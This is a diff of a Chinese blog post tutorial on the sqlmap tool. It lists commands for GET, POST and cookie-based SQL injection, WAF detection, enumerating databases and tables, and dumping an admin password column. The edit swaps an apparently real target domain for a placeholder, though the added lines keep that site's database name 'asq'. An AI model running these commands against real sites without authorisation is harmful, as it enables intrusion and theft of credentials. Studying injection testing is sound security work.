@@ -13,7 +13,7 @@
 <meta property="og:site_name">
 <meta property="og:description" content="sqlmap的常规语句规则和使用方法">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-01T15:28:39.966Z">
+<meta property="og:updated_time" content="2019-04-01T15:35:16.129Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqlmap使用介绍">
 <meta name="twitter:description" content="sqlmap的常规语句规则和使用方法">
@@ -352,11 +352,31 @@
 <h1 id="sqlmap实战"><a href="#sqlmap实战" class="headerlink" title="sqlmap实战"></a><font color="#3399FF">sqlmap实战</font></h1><hr>
 <ol>
 <li><p>三种类型的SQL注入检测：<br> 1：GET方式的注入检测，URL显示并且传输的方式 </p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u "http://www.asq.com.cn/document.php?id=5"</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php?id=5"</span><br></pre></td></tr></table></figure>
 <p> 2：POST方式的注入检测，隐秘传输方式</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u "http://www.asq.com.cn/document.php" <span class="comment">--data "id=5"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php" <span class="comment">--data "id=5"</span></span><br></pre></td></tr></table></figure>
 <p> 3：Cookie中转注入(通过cookie提交注入语句)</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u http://172.16.12.2/onews.asp <span class="comment">--cookie "id=40" --level 3 --dbs --tables</span></span><br><span class="line"><span class="comment">#-u 代表要测试的Url，--cookie表示使用cookie的方式提交， --level 表示测试的等级, --dbs表示将数据库显示出来，--tables是将表名显示出来</span></span><br><span class="line"></span><br><span class="line">语句：sqlmap.py -u http://172.16.12.2/onews.asp <span class="comment">--cookie "id=40" --level 3 --dbs -T admin --columns</span></span><br><span class="line"><span class="comment">#-T代表 当前要猜解的表名， --columns 代表猜解列</span></span><br><span class="line"></span><br><span class="line">语句：sqlmap.py -u http://172.16.12.2/onews.asp <span class="comment">--cookie "id=40" --level 3 --dbs -T admin -C admin password --dump</span></span><br><span class="line"><span class="comment">#--dump的意思是 将数据内容脱到本地</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u http://192.168.12.2/onews.asp <span class="comment">--cookie "id=40" --level 3 --dbs --tables</span></span><br><span class="line"><span class="comment">#-u 代表要测试的Url，--cookie表示使用cookie的方式提交， --level 表示测试的等级, --dbs表示将数据库显示出来，--tables是将表名显示出来</span></span><br><span class="line"></span><br><span class="line">语句：sqlmap.py -u http://192.168.12.2/onews.asp <span class="comment">--cookie "id=40" --level 3 --dbs -T admin --columns</span></span><br><span class="line"><span class="comment">#-T代表 当前要猜解的表名， --columns 代表猜解列</span></span><br><span class="line"></span><br><span class="line">语句：sqlmap.py -u http://192.168.12.2/onews.asp <span class="comment">--cookie "id=40" --level 3 --dbs -T admin -C admin password --dump</span></span><br><span class="line"><span class="comment">#--dump的意思是 将数据内容脱到本地</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>识别waf：sqlmap中自带了识别waf的模块可以识别出网站的waf种类，如果安装的waf没有什么特征，识别出来的就是：Generic。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php" <span class="comment">--identify-waf --batch</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据库的数据库类型以及版本</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php?id=5"</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据库的库名和用户名<br> 1：获取数据库库名、表名、列名、字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php?id=5" <span class="comment">--current-db</span></span><br><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php?id=5" <span class="comment">--tables -D "asq"</span></span><br><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php?id=5" <span class="comment">--columns -T "nt_admin" -D "asq"</span></span><br><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php?id=5" <span class="comment">--dump -C "admin_password" -T "nt_admin" -D "asq"</span></span><br></pre></td></tr></table></figure>
+<p> 2：获取数据库用户名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php?id=5" <span class="comment">--current-user</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据库的数据量</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php?id=5" <span class="comment">--count -D "asq"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断用户权限（sqlserver最高权限用户名:sa;mysql最高权限用户名:root）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap -u "http://www.xxx.com.cn/document.php?id=5" <span class="comment">--privileges</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>管理远程数据库:<br> 1：远程连接数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句：sqlmap –d "mysql://用户名:密码@地址:端口/数据库名"</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 <h1 id="未完待续……"><a href="#未完待续……" class="headerlink" title=" 未完待续…… "></a><font color="#3399FF"> 未完待续…… </font></h1>
@@ -417,7 +437,7 @@
         <p><span>本文标题:</span><a href="/2019/04/01/sqlmap使用介绍/">sqlmap使用介绍</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Hussar 的个人博客">Hussar</a></p>
         <p><span>发布时间:</span>2019年04月01日 - 20时25分</p>
-        <p><span>最后更新:</span>2019年04月01日 - 23时28分</p>
+        <p><span>最后更新:</span>2019年04月01日 - 23时35分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/04/01/sqlmap使用介绍/" title="sqlmap使用介绍">https://Hussar118.github.io/2019/04/01/sqlmap使用介绍/</a>
             <span class="copy-path" data-clipboard-text="原文: https://Hussar118.github.io/2019/04/01/sqlmap使用介绍/　　作者: Hussar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
